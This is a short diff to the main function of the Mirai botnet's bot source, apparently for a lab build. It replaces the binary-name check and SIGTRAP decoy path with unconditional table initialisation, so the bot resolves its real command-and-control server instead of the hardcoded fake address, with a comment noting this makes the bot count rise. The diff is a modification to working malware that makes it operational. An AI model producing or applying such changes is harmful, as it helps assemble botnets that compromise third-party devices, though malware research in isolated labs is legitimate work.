@@ -107,12 +107,17 @@ int main(int argc, char **args)
     srv_addr.sin_addr.s_addr = FAKE_CNC_ADDR;
     srv_addr.sin_port = htons(FAKE_CNC_PORT);
 
+    /* Lab: debug always inits table + resolve. Original release only enables
+     * resolve_cnc_addr when argv matches "./dvrHelper" (SIGTRAP path). Running
+     * as ./mirai.x86 leaves resolve_func on FAKE_CNC (65.222.202.53:80) so
+     * botcount never rises. Force the same init path as DEBUG for lab builds. */
 #ifdef DEBUG
     unlock_tbl_if_nodebug(args[0]);
     anti_gdb_entry(0);
 #else
-    if (unlock_tbl_if_nodebug(args[0]))
-        raise(SIGTRAP);
+    table_init();
+    anti_gdb_entry(0);
+    (void)unlock_tbl_if_nodebug(args[0]);
 #endif
 
     ensure_single_instance();
